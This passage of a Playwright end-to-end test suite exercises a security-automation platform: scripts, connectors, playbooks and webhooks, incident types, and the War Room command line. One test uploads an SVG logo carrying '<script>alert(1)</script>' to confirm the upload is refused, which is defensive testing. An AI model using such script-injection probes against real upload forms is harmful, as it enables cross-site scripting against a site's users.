  await expect(create.getByRole('alert')).toContainText('A capital letter')
  await expect(create.getByRole('button', { name: 'Create' })).toBeDisabled()
  await create.getByLabel('Name').fill('CountWords')
  await create.getByLabel('Description').fill('How many words a text has')
  await create.getByRole('button', { name: 'Create' }).click()
  await expect(page).toHaveURL(/\/automation\/scripts\/[0-9a-f]+$/)
  await expect(area.getByRole('heading', { name: 'CountWords' })).toBeVisible()
  await expect(area.getByText('no version yet: not in the library')).toBeVisible()

  // The code, what it takes and gives, and its test.
  const code = area.getByRole('textbox', { name: 'Code of the script' })
  await write(code, 'print("no function here")\n')
  await expect(area.getByRole('alert', { name: 'Before the script can be tested' })).toContainText('def main(args)')
  await expect(area.getByRole('button', { name: 'Run the test' })).toBeDisabled()
  await write(
    code,
    'def main(args):\n    words = str(args.get("text", "")).split()\n    print("counting", len(words))\n    return {"count": len(words)}\n',
  )
  await area.getByLabel('Argument 1: name').fill('text')
  await area.getByLabel('Output 1: name').fill('count')
  await area.getByLabel('Output 1: type').selectOption('number')
  await write(area.getByRole('textbox', { name: 'Arguments of the test' }), '{"text": "one two three"')
  await expect(area.getByRole('alert', { name: 'Before the script can be tested' })).toContainText('Not JSON')
  await write(area.getByRole('textbox', { name: 'Arguments of the test' }), '{"text": "one two three"}')
  await write(area.getByRole('textbox', { name: 'What the test expects' }), '{"count": 2}')
  await expect(area.getByText('draft saved')).toBeVisible()
  // The draft is the server's: a reload finds the code.
  await page.reload()
  await expect(code).toContainText('counting')

  if (sandbox) {
    const result = area.getByRole('status', { name: 'Result of the test' })
    // The test runs the draft: it returns 3, the test expected 2.
    await area.getByRole('button', { name: 'Run the test' }).click()
    await expect(result).toContainText('failed')
    await expect(result).toContainText('did not return what the test expects')
    await expect(result).toContainText('counting 3')
    // A version needs the test to pass.
    await area.getByRole('button', { name: 'Save as version 1' }).click()
    await expect(page.getByText(/^The test does not pass/)).toBeVisible()
    await write(area.getByRole('textbox', { name: 'What the test expects' }), '{"count": 3}')
    await area.getByRole('button', { name: 'Run the test' }).click()
    await expect(result).toContainText('passed')
    await area.getByRole('button', { name: 'Save as version 1' }).click()
    await expect(page.getByText('Version 1 saved: CountWords is in the library of nodes.')).toBeVisible()
    await expect(area.getByText('script · version 1')).toBeVisible()
    await expect(area.getByRole('button', { name: 'Save as version 2' })).toBeDisabled()

    // What the draft changes from a version, line by line; the version can be put back.
    await write(
      code,
      'def main(args):\n    words = str(args.get("text", "")).split()\n    return {"count": len(words)}\n',
    )
    await expect(area.getByText('draft changed')).toBeVisible()
    await area.getByRole('button', { name: 'See version 1' }).click()
    const version = page.getByRole('dialog', { name: 'Version 1' })
    await expect(version).toContainText('0 lines added, 1 removed')
    await expect(version.getByLabel('What the draft changes from version 1')).toContainText(
      '-     print("counting", len(words))',
    )
    await version.getByRole('button', { name: 'Put version 1 back into the draft' }).click()
    await expect(code).toContainText('counting')

    // The script is now a node of the library.
    await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Playbooks' }).click()
    await area.getByRole('button', { name: 'Note on high' }).click()
    const library = area.getByRole('complementary', { name: 'Node library' })
    await library.getByLabel('Search nodes').fill('countwords')
    await expect(library.getByRole('button', { name: 'CountWords' })).toBeVisible()
  } else {
    await area.getByRole('navigation', { name: 'Automations' }).getByRole('button', { name: 'Scripts' }).click()
    await expect(area.getByRole('region', { name: 'The box every script runs in' }).getByRole('alert')).toContainText(
      'The sandbox is not configured',
    )
    await expect(area.getByRole('row').filter({ hasText: 'CountWords' })).toContainText('draft · not usable yet')
  }

  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a connector is added from its file, a connection is made, and its commands are nodes', async () => {
  test.setTimeout(180_000)
  const before = page.url()
  const source = readFileSync(new URL('./fixtures/acme-connector.yml', import.meta.url), 'utf8')
  const file = (text) => ({ name: 'acme.yml', mimeType: 'text/yaml', buffer: Buffer.from(text) })

  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Connectors').click()
  await expect(page).toHaveURL(/\/settings\/automation\/connectors$/)

  // A file with a mistake is not installed: the problem comes with its line.
  const wrong = source.replace(
    'request: { method: GET, path: "/tickets/{{ args.number }}" }',
    'request: { method: FETCH, path: "/tickets/{{ args.nmber }}" }',
  )
  await settings.getByLabel('Connector file to add').setInputFiles(file(wrong))
  const add = page.getByRole('dialog', { name: 'Add acme.yml' })
  const problems = add.getByRole('list', { name: 'Problems of the file' })
  await expect(problems.getByRole('listitem')).toHaveCount(1)
  await expect(problems).toContainText('line 16')
  await expect(add.getByRole('button', { name: 'Install' })).toBeDisabled()
  await add.getByRole('button', { name: 'Cancel' }).click()

  await settings.getByLabel('Connector file to add').setInputFiles(file(source))
  await expect(add).toContainText('version 1: 2 commands')
  await expect(add).toContainText('a user name and a password')
  await add.getByRole('button', { name: 'Install' }).click()
  await expect(settings.getByRole('status')).toContainText('Acme Desk is installed: version 1, 2 commands.')
  const installed = settings
    .getByRole('list', { name: 'Connectors', exact: true })
    .getByRole('listitem')
    .filter({ hasText: 'Acme Desk' })
    .first()
  await expect(installed).toContainText('not configured')
  await expect(installed).toContainText('not verified')
  // The filters count them, and the box finds one by its name.
  const which = settings.getByRole('group', { name: 'Which connectors' })
  await expect(which.getByRole('button', { name: /^Not configured/ })).toContainText(/· \d+$/)
  await settings.getByLabel('Find a connector or an instance').fill('acme desk')
  await expect(settings.getByRole('list', { name: 'Connectors', exact: true }).locator('> li')).toHaveCount(1)
  // Its commands and its file can be read.
  await installed.getByRole('button', { name: 'Acme Desk', exact: true }).click()
  const shown = page.getByRole('dialog', { name: 'Acme Desk' })
  await expect(shown.getByRole('table', { name: 'Commands of Acme Desk' }).getByRole('row')).toHaveCount(3)
  await shown.getByText('The file', { exact: true }).click()
  await expect(shown.getByLabel('The file of Acme Desk')).toContainText('base_url: "{{ config.url }}"')
  // It is given a logo: an image that is not a drawing is refused, a drawing marks the connector.
  const svg = (inner) => ({
    name: 'logo.svg',
    mimeType: 'image/svg+xml',
    buffer: Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8">${inner}</svg>`),
  })
  await shown.getByLabel('Logo of Acme Desk').setInputFiles(svg('<script>alert(1)</script>'))
  await expect(shown.getByRole('alert')).toContainText('a drawing and nothing else')
  await shown.getByLabel('Logo of Acme Desk').setInputFiles(svg('<rect width="8" height="8" fill="#246"/>'))
  await expect(shown.getByRole('button', { name: 'Change the logo' })).toBeVisible()
  await shown.getByRole('button', { name: 'Close', exact: true }).last().click()
  const logo = installed.locator('img').first()
  await expect(logo).toHaveAttribute('src', /\/api\/automation\/connectors\/acme\/logo\?v=/)
  expect(await logo.evaluate((image) => image.complete && image.naturalWidth > 0)).toBe(true)

  // An instance, under its connector: the form is the connector's; credentials are written and
  // never shown again. There is no Connections section any more.
  await expect(sections.getByRole('button', { name: 'Connections', exact: true })).toHaveCount(0)
  await installed.getByRole('button', { name: 'Add an instance of Acme Desk' }).click()
  const form = settings.getByRole('complementary', { name: 'New instance of Acme Desk' })
  await form.locator('#instance-name').fill('Acme test')
  await form.getByLabel('Instance address').fill('desk.example.invalid')
  await expect(form.getByRole('button', { name: 'Create' })).toBeDisabled() // not an https:// address
  await form.getByLabel('Instance address').fill('https://desk.example.invalid/api')
  await form.getByLabel('User name').fill('svc')
  await form.getByLabel('Password').fill('s3cret-pass')
  await form.getByRole('button', { name: 'Create' }).click()
  const row = installed
    .getByRole('list', { name: 'Instances of Acme Desk' })
    .getByRole('listitem')
    .filter({ hasText: 'Acme test' })
  await expect(row).toContainText('desk.example.invalid')
  await expect(row).toContainText('never tested')
  await expect(installed).toContainText('1 instance · on')
  await row.getByRole('button', { name: 'Edit Acme test' }).click()
  const edit = settings.getByRole('complementary', { name: 'Instance Acme test' })
  await expect(edit.getByLabel(/^Password/)).toHaveValue('')
  await expect(edit.getByLabel(/^Password/)).toHaveAttribute('placeholder', 'stored: type to replace it')
  await edit.getByRole('button', { name: 'Close the instance' }).click()
  // Off and on again: the connector is enabled while one of its instances is on.
  await row.getByRole('switch', { name: 'Acme test is on' }).click()
  await expect(installed).toContainText('1 instance · off')
  await row.getByRole('switch', { name: 'Acme test is off' }).click()
  await expect(installed).toContainText('1 instance · on')
  // The test reaches the host of the instance: this one does not exist, and the row says so.
  await row.getByRole('button', { name: 'Test the instance Acme test' }).click()
  await expect(settings.getByRole('alert')).toContainText('Acme test: ', { timeout: 30_000 })
  await expect(row).toContainText('failed')
  await settings.getByLabel('Find a connector or an instance').fill('')
  await settings.getByRole('button', { name: 'Close settings' }).click()

  // On the canvas the connector is a group of the library; a node of it names its connection.
  await page.getByRole('button', { name: 'Automations', exact: true }).click()
  const area = page.getByRole('region', { name: 'Automations' })
  await area.getByRole('button', { name: 'Note on high' }).click()
  const library = area.getByRole('complementary', { name: 'Node library' })
  await library.getByLabel('Search nodes').fill('acme')
  await expect(library.getByRole('button', { name: /^create-ticket/ })).toContainText('changes')
  await library.getByRole('button', { name: 'get-ticket', exact: true }).click()
  const inspector = area.getByRole('complementary', { name: 'Inspector' })
  await expect(inspector.getByRole('heading', { name: /Acme Desk/ })).toBeVisible()
  await expect(inspector.getByLabel(/^Instance/)).toHaveValue('')
  await inspector.getByLabel(/^Instance/).selectOption('Acme test')
  await inspector.getByLabel(/^number/).fill('T-1')
  await expect(area.getByText('draft saved')).toBeVisible()
  // The playbook is left as it was.
  await area.getByRole('button', { name: 'Undo' }).click()
  await area.getByRole('button', { name: 'Undo' }).click()
  await area.getByRole('button', { name: 'Undo' }).click()
  await expect(area.getByTestId('playbook-canvas').locator('.react-flow__node')).toHaveCount(4)
  await expect(area.getByText('draft saved')).toBeVisible()

  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a playbook is run on an artifact from its menu, and started from outside at its own address', async ({
  request,
}) => {
  test.setTimeout(180_000)
  const before = page.url()
  const menu = page.getByRole('menu')
  const look = (name, value) => ({
    id: 'look',
    kind: 'action',
    name,
    position: { x: 40, y: 160 },
    config: { action: 'nik.get-indicator', args: { value } },
  })
  const make = async (name, trigger, node) => {
    const made = await page.request.post('/api/automation/playbooks', { data: { name } })
    expect(made.status()).toBe(201)
    const id = (await made.json()).id
    const graph = {
      nodes: [{ id: 'start', kind: 'trigger', name: 'Trigger', position: { x: 40, y: 40 }, config: trigger }, node],
      edges: [{ from: 'start', to: 'look' }],
    }
    const saved = await page.request.post(`/api/automation/playbooks/${id}/versions`, { data: { graph } })
    expect(saved.status(), await saved.text()).toBe(201)
    return id
  }
  const onFile = await make(
    'Look up a file',
    { event: 'file.analysed', manual: true },
    look('Look up its hash', '{{ trigger.file.sha256 }}'),
  )
  const onMail = await make(
    'Triage a mail',
    { event: 'mail.analysed', manual: true },
    look('Look up the sender', '{{ trigger.mail.sender_domain }}'),
  )
  const outside = await make(
    'From outside',
    { webhook: true },
    look('Look up what was sent', '{{ trigger.body.value }}'),
  )

  // The menu of an artifact offers the playbooks that run on it: one about e-mails is not among them.
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('navigation', { name: 'Artifacts' }).getByText('dropper.bin').click({ button: 'right' })
  await menu.getByRole('menuitem', { name: 'Run a playbook…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Run a playbook' })
  await expect(dialog.locator('#run-object')).toContainText('a file · dropper.bin')
  const choice = dialog.locator('#run-playbook')
  await expect(choice.locator(`option[value="${onFile}"]`)).toHaveCount(1)
  await expect(choice.locator(`option[value="${onMail}"]`)).toHaveCount(0)
  await choice.selectOption(onFile)
  await dialog.getByRole('button', { name: 'Run', exact: true }).click()
  await expect(page).toHaveURL(/\/automation\/runs\/[0-9a-f]+$/)
  const area = page.getByRole('region', { name: 'Automations' })
  await expect(area.getByRole('status', { name: 'Status of the run' })).toHaveText('done', { timeout: 20_000 })

  // The artifact's own page lists the run.
  await area.getByRole('button', { name: 'Close automations' }).click()
  await panel.getByRole('navigation', { name: 'Artifacts' }).getByText('dropper.bin').click()
  const strip = page.getByLabel('Playbook runs on this artifact')
  await expect(strip.getByRole('button', { name: /Look up a file/ })).toContainText('done')
  await expect(strip.getByRole('button', { name: 'Run a playbook…' })).toBeVisible()

  // A playbook that starts from outside gets an address in its Settings, shown once.
  await page.goto(`/automation/playbooks/${outside}/settings`)
  const hook = area.getByRole('region', { name: 'Address for requests from outside' })
  await expect(hook).toContainText('It has no address yet.')
  await hook.getByRole('button', { name: 'Create the address' }).click()
  const address = (await hook.locator('#hook-address').textContent()).trim()
  expect(address).toMatch(/\/api\/automation\/hooks\/[\w-]{40,}$/)

  // Off, it answers as an address that does not exist; on, a request with no session starts it.
  const send = () => request.post(new URL(address).pathname, { data: { value: '185.220.101.47' } })
  expect((await send()).status()).toBe(404)
  expect(
    (await page.request.put(`/api/automation/playbooks/${outside}/enabled`, { data: { enabled: true } })).status(),
  ).toBe(200)
  const taken = await send()
  expect(taken.status()).toBe(202)
  expect(await taken.json()).toEqual({ accepted: true })
  await expect(async () => {
    const runs = await (await page.request.get(`/api/automation/runs?playbook=${outside}`)).json()
    expect(runs.runs.map((run) => [run.trigger, run.status])).toEqual([['webhook', 'done']])
  }).toPass({ timeout: 20_000 })

  // Read again, the page no longer shows it; replaced, the old one stops working.
  await page.reload()
  await expect(hook).toContainText('Nik keeps only its hash')
  await expect(hook.locator('#hook-address')).toHaveCount(0)
  await hook.getByRole('button', { name: 'Replace the address' }).click()
  await page.getByRole('dialog', { name: 'Replace the address?' }).getByRole('button', { name: 'Replace' }).click()
  await expect(hook.locator('#hook-address')).not.toHaveText(address)
  expect((await send()).status()).toBe(404)

  for (const id of [onFile, onMail, outside]) {
    expect((await page.request.delete(`/api/automation/playbooks/${id}`)).status()).toBe(204)
  }
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('a type of incident is built with a field of its own, and closing asks for what it wants', async () => {
  test.setTimeout(120_000)
  const before = page.url()
  const incidentId = decodeURIComponent(new URL(before).pathname.split('/')[2])
  const was = (await (await page.request.get(`/api/incidents/${incidentId}/fields`)).json()).fields.status

  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
  await sections.getByText('Types', { exact: true }).click()
  await expect(page).toHaveURL(/\/settings\/incidents\/types$/)
  // The types Nik ships; every incident that was given none is Unclassified.
  const types = settings.getByRole('table', { name: 'Incident types' })
  await expect(types.getByRole('row')).toHaveCount(8)
  await expect(types.getByRole('row').nth(1)).toContainText('Unclassified')

  await settings.getByRole('button', { name: 'New type' }).click()
  const create = page.getByRole('dialog', { name: 'New type' })
  await create.locator('#new-type-name').fill('E2E outage')
  await create.getByRole('button', { name: 'Create the type' }).click()
  await expect(settings.locator('#type-name')).toHaveValue('E2E outage')

  // A field of its own, made from the side list: it lands in the section that is being added to.
  const offered = settings.getByRole('region', { name: 'Fields to add' })
  await offered.getByRole('button', { name: 'New field' }).click()
  const field = page.getByRole('dialog', { name: 'New field' })
  await field.locator('#field-label').fill('Root cause')
  await expect(field.locator('#field-name')).toHaveValue('root_cause')
  await field.locator('#field-type').selectOption('long_text')
  await field.getByRole('button', { name: 'Create the field' }).click()
  const about = settings.getByRole('region', { name: 'Section What it is about' })
  const placed = about.getByRole('listitem').filter({ hasText: 'Root cause' })
  await expect(placed).toHaveCount(1)
  await placed.getByLabel('to close').check()
  // A field of the registry is added with a click, and moved with the arrows.
  await offered.getByPlaceholder('Find a field…').fill('due')
  await offered.getByRole('button', { name: /^Due/ }).click()
  await expect(about.getByRole('listitem').last()).toContainText('Due')
  await about.getByRole('button', { name: 'Move Due up' }).click()
  await expect(about.getByRole('listitem').last()).toContainText('Root cause')
  // A section of its own, made the side panel in place of the first.
  await settings.getByRole('button', { name: 'Add a section' }).click()
  const added = settings.getByRole('region', { name: 'Section New section' })
  await added.getByLabel('Title of the section').fill('Impact')
  await settings.locator('#type-reasons').fill('Fixed\nNot ours')
  // The page of the type: the grid Nik makes from the sections, and a widget added to it.
  const arranged = settings.getByRole('region', { name: 'The page' })
  await expect(arranged).toContainText('the page Nik makes from the sections')
  await expect(arranged.getByRole('article')).toHaveCount(5)
  await expect(arranged.getByRole('article', { name: 'Impact' })).toBeVisible()
  await arranged.locator('#page-add-kind').selectOption('note')
  await arranged.getByRole('button', { name: 'Add', exact: true }).click()
  await expect(arranged).toContainText('arranged by hand')
  await arranged.getByRole('button', { name: 'Edit A text' }).click()
  const widget = page.getByRole('dialog', { name: 'Widget: A text' })
  await widget.locator('#widget-title').fill('First steps')
  await widget.locator('#widget-text').fill('Call the owner of the service.')
  await widget.getByRole('button', { name: 'Done' }).click()
  await expect(arranged.getByRole('article', { name: 'First steps' })).toContainText('Call the owner of the service.')
  // What is on a page once is not offered again; a widget is moved with the keyboard.
  await expect(arranged.locator('#page-add-kind').locator('option')).not.toContainText(['Incident details'])
  const grip = arranged.getByRole('button', { name: /^Move First steps/ })
  await grip.focus()
  await page.keyboard.press('ArrowRight')
  await expect(settings.getByText('not saved')).toBeVisible()
  await settings.getByRole('button', { name: 'Save the type' }).click()
  await expect(settings.getByText('not saved')).toHaveCount(0)
  const saved = await (await page.request.get('/api/incident-types/e2e-outage')).json()
  expect(saved.layout.grid.map((item) => item.kind)).toEqual([
    'facts',
    'stats',
    'section',
    'section',
    'timeline',
    'note',
  ])
  expect(saved.layout.grid.at(-1)).toMatchObject({ title: 'First steps', text: 'Call the owner of the service.', x: 1 })
  expect(saved.fields).toEqual([{ name: 'root_cause', required: false, requiredOnClose: true }])
  expect(saved.closeReasons).toEqual(['Fixed', 'Not ours'])
  expect(saved.layout.sections.map((section) => section.title)).toEqual(['Key facts', 'What it is about', 'Impact'])
  expect(saved.layout.sections[1].fields.slice(-2)).toEqual(['due', 'root_cause'])

  // The registry as a whole: the new field is there, with where it is used.
  await sections.getByText('All fields', { exact: true }).click()
  await expect(page).toHaveURL(/\/settings\/incidents\/all-fields$/)
  await settings.getByPlaceholder('Find a field…').fill('root')
  const all = settings.getByRole('table', { name: 'All fields' })
  await expect(all.getByRole('row')).toHaveCount(2)
  await all.getByRole('button', { name: 'Edit the field Root cause' }).click()
  const edit = page.getByRole('dialog', { name: 'Field root_cause' })
  await expect(edit).toContainText('Listed by: E2E outage.')
  await edit.getByRole('button', { name: 'Cancel' }).click()
  await settings.getByRole('button', { name: 'Close settings' }).click()

  // An incident of that type cannot be closed without what the type wants: the form asks for it.
  const opened = await page.request.patch(`/api/incidents/${incidentId}/fields`, {
    data: { changes: { type: 'e2e-outage', status: 'open' } },
  })
  expect(opened.status(), await opened.text()).toBe(200)
  await page.goto(before)
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary', exact: true }).click()
  const details = page.getByRole('article', { name: 'Incident details' })
  await expect(details).toContainText('open')

  // The page follows the type: its key facts in a panel beside the tabs, its other sections in the Summary.
  const facts = page.getByRole('complementary', { name: 'Incident facts' })
  await expect(facts).toContainText('E2E outage')
  await expect(facts.locator('#incident-type')).toHaveValue('e2e-outage')
  await facts.getByRole('button', { name: 'Edit' }).click()
  const key = page.getByRole('dialog', { name: 'Key facts' })
  await key.locator('#edit-tlp').selectOption('amber')
  await key.locator('#edit-occurred').fill('2026-11-16T08:30')
  await key.getByRole('button', { name: 'Save' }).click()
  await expect(key).toHaveCount(0)
  await expect(facts).toContainText('amber')
  await expect(facts).toContainText('2026-11-16 08:30 UTC')
  // It stays while the tabs change, and folds away for a wide one.
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'Timeline', exact: true }).click()
  await expect(facts).toContainText('amber')
  await facts.getByRole('button', { name: "Hide the incident's facts" }).click()
  await expect(facts).not.toContainText('amber')
  await facts.getByRole('button', { name: "Show the incident's facts" }).click()
  await expect(facts).toContainText('amber')
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  // The Summary is the page the type arranged: its widgets, with the text added in Settings.
  const summary = page.getByRole('region', { name: 'Summary of the incident' })
  await expect(summary.getByRole('article', { name: 'First steps' })).toContainText('Call the owner of the service.')
  await expect(summary.getByRole('article')).toHaveCount(6)
  const section = summary.getByRole('article', { name: 'What it is about' })
  await expect(section).toContainText('Root cause')
  await section.getByRole('button', { name: 'Edit What it is about' }).click()
  const form = page.getByRole('dialog', { name: 'What it is about' })
  await form.locator('#edit-labels').fill('outage, e2e')
  await form.locator('#edit-due').fill('2026-12-01T12:00')
  await form.getByRole('button', { name: 'Save' }).click()
  await expect(form).toHaveCount(0)
  await expect(section).toContainText('outage')
  await expect(section).toContainText('2026-12-01 12:00 UTC')

  await details.getByRole('button', { name: 'Edit the incident' }).click()
  const editing = page.getByRole('dialog', { name: 'Edit the incident' })
  await editing.locator('#incident-status').selectOption('closed')
  await editing.getByRole('button', { name: 'Save', exact: true }).click()
  const closing = page.getByRole('dialog', { name: 'Close the incident' })
  await expect(closing).toContainText('E2E outage')
  await expect(closing.locator('#close-reason').locator('option')).toHaveText(['(not set)', 'Fixed', 'Not ours'])
  await closing.locator('#close-reason').selectOption('Fixed')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing.getByRole('alert')).toHaveText('Root cause is needed to close')
  await closing.locator('#close-field-root_cause').fill('A rule written too wide.')
  await closing.getByRole('button', { name: 'Close the incident' }).click()
  await expect(closing).toHaveCount(0)
  await expect(details).toContainText('closed')
  const held = (await (await page.request.get(`/api/incidents/${incidentId}/fields`)).json()).fields
  expect([held.status, held.close_reason, held.root_cause]).toEqual(['closed', 'Fixed', 'A rule written too wide.'])
  expect(held.closed).toBeTruthy()

  // Left as it was for what follows, with no type; the type is deleted and its incident keeps its values.
  expect((await page.request.delete('/api/incident-types/e2e-outage')).status()).toBe(204)
  const again = await page.request.patch(`/api/incidents/${incidentId}/fields`, {
    data: { changes: { status: was } },
  })
  expect(again.status()).toBe(200)
  await page.goto(before)
  await expect(page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary' })).toBeEnabled()
})

test('the Context tab shows what playbooks read of the incident, with the path of each value', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  const tree = page.getByRole('tree', { name: 'Context of the incident' })
  // The incident may still be settling on the tab its type remembers (the test before changed its type).
  await expect(async () => {
    await tabs.getByRole('button', { name: 'Context', exact: true }).click()
    await expect(tree).toBeVisible({ timeout: 2000 })
  }).toPass()
  // Two roots: the fields of the incident, and what the analysis found for it.
  await expect(tree.getByRole('treeitem', { name: /^incident/ }).first()).toBeVisible()
  await expect(tree.getByRole('treeitem', { name: /^File \d+ items?$/ })).toBeVisible()
  await tree
    .getByRole('treeitem', { name: /^File \d+ items?$/ })
    .getByRole('button')
    .click()
  await tree
    .getByRole('treeitem', { name: /^File \d+ items?$/ })
    .getByRole('button')
    .click()
  await tree
    .getByRole('treeitem', { name: /^0 \d+$/ })
    .first()
    .getByRole('button')
    .click()
  const hash = tree.getByRole('treeitem', { name: /^SHA256 [0-9a-f]{64}$/ }).first()
  await hash.getByRole('button').click()
  const chosen = page.getByLabel('The chosen value')
  await expect(chosen).toContainText('{{ context.File[0].SHA256 }}')
  await expect(chosen).toContainText('${context.File[0].SHA256}')
  await expect(chosen).toContainText("Set by Nik's analysis")
  // A search keeps what matches, with what leads to it.
  await page.getByPlaceholder('Find a key or a value…').fill('WKS-FINANCE-01')
  await expect(tree.getByRole('treeitem', { name: /^host WKS-FINANCE-01$/ })).toBeVisible()
  await expect(tree.getByRole('treeitem', { name: /^SHA256/ })).toHaveCount(0)
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
})

test('the War Room holds what was said and done on the incident, and marks evidence', async () => {
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'War Room', exact: true }).click()
  const stream = page.getByRole('list', { name: 'War Room' })
  // What the playbook of an earlier test did here is in it: its steps, the approval, the note it wrote.
  await expect(stream.getByText('Approved by admin: looks right')).toBeVisible()
  await expect(
    stream
      .getByText('Ask first: go ahead?')
      .or(stream.getByText(/^Add a note to/))
      .first(),
  ).toBeVisible()

  // Plain text written below is a note of the incident.
  await page.locator('#war-room-line').fill('Laptop collected from the finance office.')
  await page.locator('#war-room-line').press('Enter')
  const note = stream.getByRole('listitem').filter({ hasText: 'Laptop collected from the finance office.' })
  await expect(note).toHaveCount(1)
  await expect(page.locator('#war-room-line')).toHaveValue('')

  // The chips keep one kind.
  const show = page.getByRole('group', { name: 'Show' })
  await show.getByRole('button', { name: 'Automation' }).click()
  await expect(note).toHaveCount(0)
  const step = stream.getByRole('listitem').filter({ hasText: 'playbook Ask then note' }).first()
  await expect(step).toBeVisible()
  // The inspector shows what the step was given and gave, and opens its run.
  await step.getByRole('button', { name: /^automation/ }).click()
  const inspector = page.getByRole('complementary', { name: 'The chosen entry' })
  await expect(inspector.getByRole('heading', { name: 'Result' })).toBeVisible()
  await expect(inspector.getByRole('heading', { name: 'What it was given' })).toBeVisible()
  await expect(inspector.getByRole('button', { name: 'Open the run' })).toBeVisible()
  await inspector.getByRole('button', { name: 'Close the entry' }).click()

  // An entry marked as evidence is found among the evidence.
  await show.getByRole('button', { name: 'Notes' }).click()
  await note.getByRole('button').first().click()
  await inspector.getByRole('button', { name: 'Mark as evidence' }).click()
  await expect(note).toContainText('evidence')
  await show.getByRole('button', { name: 'Evidence' }).click()
  await expect(stream.getByRole('listitem').filter({ hasText: /\S/ })).toHaveCount(1)
  await expect(note).toHaveCount(1)
  // It is a note of the incident like any other: the Summary shows it.
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
  await expect(page.getByText('Laptop collected from the finance office.')).toBeVisible()
})

test('the command line of the War Room runs commands, asks before a change outside, and closes', async () => {
  test.setTimeout(120_000)
  const tabs = page.locator('nav[aria-label="Analysis tabs"]')
  await tabs.getByRole('button', { name: 'War Room', exact: true }).click()
  const stream = page.getByRole('list', { name: 'War Room' })
  const line = page.locator('#war-room-line')
  await page.getByRole('group', { name: 'Show' }).getByRole('button', { name: 'All' }).click()

  // The name of a command is completed while it is typed, and its arguments are hinted.
  await line.fill('!nik-get-ind')
  const offered = page.getByRole('listbox', { name: 'Commands' })
  await expect(offered.getByRole('option')).toHaveText([/!nik-get-indicator/])
  await line.press('Tab')
  await expect(line).toHaveValue('!nik-get-indicator ')
  await expect(page.getByLabel('Arguments of the command')).toContainText('value=')
  await line.pressSequentially('185.220.101.47')
  await line.press('Enter')
  // The command, and under it what it gave.
  const command = stream.getByRole('listitem').filter({ hasText: '!nik-get-indicator 185.220.101.47' })
  await expect(command).toHaveCount(1)
  const result = stream.getByRole('listitem').filter({ hasText: /^automation.*nik-get-indicator/ })
  await expect(result).toHaveCount(1, { timeout: 20_000 })
  await result.getByRole('button').first().click()
  const inspector = page.getByRole('complementary', { name: 'The chosen entry' })
  await expect(inspector.getByRole('heading', { name: 'Result' })).toBeVisible()
  await expect(inspector).toContainText('185.220.101.47')
  await inspector.getByRole('button', { name: 'Close the entry' }).click()
  // An address in the stream is the indicator: it opens its window.
  await command.getByRole('button', { name: '185.220.101.47' }).click()
  const indicator = page.getByRole('dialog', { name: 'Indicator' })
  await expect(indicator).toContainText('185.220.101.47')
  await page.keyboard.press('Escape')
  await expect(indicator).toBeHidden()

  // What is wrong with a line is said under it, and nothing runs.
  await line.fill('!nik-get-indicator colour=red')
  await line.press('Enter')
  await expect(page.getByRole('alert').filter({ hasText: 'is not an argument of this command' })).toBeVisible()
  // The arrow brings back the line typed before.
  await line.fill('')
  await line.press('ArrowUp')
  await expect(line).toHaveValue('!nik-get-indicator 185.220.101.47')
  await line.press('ArrowDown')
  await expect(line).toHaveValue('')

  // A command that changes something outside asks first, with the line as it will be sent.
  await line.fill('!acme-create-ticket title="From the War Room"')
  await line.press('Enter')
  const confirm = page.getByRole('dialog', { name: 'Run this command?' })
  await expect(confirm).toContainText('acme-create-ticket changes something outside Nik')
  await expect(confirm).toContainText('!acme-create-ticket title="From the War Room"')
  await confirm.getByRole('button', { name: 'Cancel' }).click()
  await expect(stream.getByRole('listitem').filter({ hasText: '!acme-create-ticket' })).toHaveCount(0)

  // A slash command: /close opens the form of closing.
  await line.fill('/cl')
  await expect(page.getByRole('listbox', { name: 'Commands' }).getByRole('option')).toHaveText([/\/close/])
  await line.press('Tab')
  await line.press('Enter')
  const closing = page.getByRole('dialog', { name: 'Close the incident' })
  await expect(closing).toBeVisible()
  await closing.getByRole('button', { name: 'Cancel' }).click()
  await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
})

test('the Playground is the War Room without an incident: a command, a note, the history cleared', async () => {
  test.setTimeout(90_000)
  const before = (await (await page.request.get('/api/incidents')).json()).incidents.length
  await page.getByRole('button', { name: 'Playground', exact: true }).click()
  await expect(page).toHaveURL(/\/playground$/)
  const room = page.getByRole('region', { name: 'Playground' })
  const stream = room.getByRole('list', { name: 'Playground' })
  const line = room.locator('#playground-line')
  await expect(stream).toContainText('Nothing here yet')
  // The chips are those that mean something with no incident.
  await expect(room.getByRole('group', { name: 'Show' }).getByRole('button')).toHaveText(['All', 'Notes', 'Commands'])

  // The same line as the War Room: completion, hints, the result under the command, its inspector.
  await line.fill('!nik-get-ind')
  await expect(room.getByRole('listbox', { name: 'Commands' }).getByRole('option')).toHaveText([/!nik-get-indicator/])
  await line.press('Tab')
